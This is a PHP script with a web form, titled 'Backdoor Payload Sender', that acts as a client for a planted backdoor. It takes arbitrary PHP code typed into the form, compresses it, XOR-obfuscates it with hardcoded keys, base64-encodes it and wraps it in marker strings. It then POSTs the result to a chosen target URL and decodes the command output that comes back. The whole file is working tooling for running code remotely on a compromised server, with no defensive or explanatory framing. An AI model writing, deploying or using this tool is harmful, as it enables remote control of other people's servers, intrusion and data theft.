<?php

// --- CONFIGURE ---
$default_target_url = 'http://localhost/index.php'; // Default value
$key = "3b712de4";
$kh = "8137572f3849";
$kf = "aabd5666a4e3";
$p = "wowzoun0lxqf0Qwj";

// --- XOR FUNCTION ---
function xor_string($data, $key) {
    $output = '';
    $dataLen = strlen($data);
    $keyLen = strlen($key);
    for ($i = 0; $i < $dataLen; $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}

// --- FORM HANDLER ---
$output = '';
$output_e = '';
$display_mode = isset($_POST['display_mode']) ? $_POST['display_mode'] : 'text';
$target_url = isset($_POST['target_url']) ? $_POST['target_url'] : $default_target_url;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['php_code'])) {
    $php_code = $_POST['php_code'];

    // Encode payload
    $compressed = gzcompress($php_code);
    $xored = xor_string($compressed, $key);
    $encoded = base64_encode($xored);
    $payload = $kh . $encoded . $kf;

    // Send payload
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: text/plain\r\n",
            'content' => $payload,
        ]
    ];
    $context  = stream_context_create($options);
    try {
        $response = @file_get_contents($target_url, false, $context);
        if ($response === false) {
            $error = error_get_last();
            $output_e = "Error sending payload: " . ($error['message'] ?? 'Unknown error');
        }
    } catch (Exception $e) {
        $output_e = "Exception: " . $e->getMessage();
    }

    // Extract and decode output
    if (preg_match("/$p$kh(.+)$kf/s", $response, $m)) {
        $resp_encoded = $m[1];
        $resp_xored = base64_decode($resp_encoded);
        $resp_decompressed = @gzuncompress(xor_string($resp_xored, $key));
        if ($display_mode === 'html') {
            $output = $resp_decompressed;
        } else {
            $output = htmlspecialchars($resp_decompressed);
        }
    } else {
        $output = "No valid response received.";
        
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Backdoor Payload Sender</title>
</head>
<body>
    <h2>Send PHP Code to Backdoor</h2>
    <form method="post">
        <label>
            Target URL:
            <input type="text" name="target_url" size="50" value="<?php echo htmlspecialchars($target_url); ?>">
        </label>
        <br><br>
        <textarea name="php_code" rows="8" cols="60" placeholder="Enter PHP code here"><?php
            if (isset($_POST['php_code'])) echo htmlspecialchars($_POST['php_code']);
        ?></textarea><br>
        <label>
            <input type="radio" name="display_mode" value="text" <?php if ($display_mode === 'text') echo 'checked'; ?>>
            Show as Text
        </label>
        <label>
            <input type="radio" name="display_mode" value="html" <?php if ($display_mode === 'html') echo 'checked'; ?>>
            Show as HTML
        </label>
        <br>
        <button type="submit">Send & Get Output</button>
    </form>
    <?php if ($output !== ''): ?>
        <h3>Output:</h3>
        <pre><?php echo $output; ?></pre>
        <pre><?php echo $output_e; ?></pre>
    <?php endif; ?>
</body>
</html>